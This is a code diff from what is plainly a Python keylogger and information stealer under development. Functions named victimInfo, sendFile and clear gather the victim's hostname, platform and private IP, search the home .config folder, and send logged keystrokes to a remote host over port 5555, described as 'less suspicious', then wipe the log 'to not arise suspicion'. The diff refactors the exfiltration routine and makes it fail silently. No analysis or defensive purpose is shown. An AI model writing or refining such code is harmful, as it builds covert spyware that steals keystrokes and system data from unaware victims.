@@ -78,7 +78,6 @@ def victimInfo(filepath: str) -> None:
         infoFile.write("Machine: " + platform.machine() + "\n")
         infoFile.write("Hostname: " + hostname + "\n")
         infoFile.write("Private IP: " + privateIP)
-    #sendEmail(filePath)
     sendFile(HOST, PORT, newFilePath)
 
 def makePath() -> str:
@@ -86,8 +85,8 @@ def makePath() -> str:
     filepath: str = ""
     username: str = ""
 
-    if os.name == "posix": # We are on a Linux or Mac sytem
-        homepath = "/home/"  # Set Home Path that is usual for Mac and Linux
+    if os.name == "posix": # We are on a Linux
+        homepath = "/home/"  # Set Home Path that is usual for Linux
         try:
             username = os.getlogin() + "/" # We will try to get their username
             filepath = searchFile(homepath + username, ".config") # We will look for .config folder
@@ -135,33 +134,26 @@ def sendFile(host: str, port: int, filepath: str) -> None:
     and using port 5555 which is one that is not used and can be
     less suspicious
     """
-    clientSocket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Start a socket object
     # Trying to send the file
     try:
-        clientSocket.connect((host, port))  # Connecting to the host and port
-        print(f"Connected to {host}:{port}")  # Debug print for now to ensure that it connected
-
-        # Send the file data to the computer
-        with open(filepath, 'rb') as file:
-            while True:
-                data = file.read(1024)
-                if not data:
-                    break
-                clientSocket.sendall(data)
-        print("File sent successfully!")  # Debug print for now to ensure that it sent
-    # Any exception that is caught will get print for debug purposes
-    except Exception as e:
-        print(f"Error occurred: {e}")
-    # At the end we will close the socket
-    finally:
-        clientSocket.close()
+        with socket.create_connection((host, port)) as clientSocket:  # Try to connect to the host
+            print(f"Connected to {host}:{port}")  # Debug print for now to ensure that it connected
+            # Send the file data to the computer
+            with open(filepath, 'rb') as file:
+                while True:
+                    data = file.read(1024)
+                    if not data:
+                        break
+                    clientSocket.sendall(data)  # Send all the data to the server
+            print("File sent successfully!")  # Debug print for now to ensure that it sent
+    except Exception:
+            return
 
 def clear(filepath: str):
     """
     Function sends the text file as an email to personal email
     and then clears out the current keys in the text file to not arise suspicion
     """
-    #sendEmail(filepath)
     sendFile(HOST, PORT, filepath)
     with open(filepath, "w") as keyFile:
         keyFile.truncate(0)
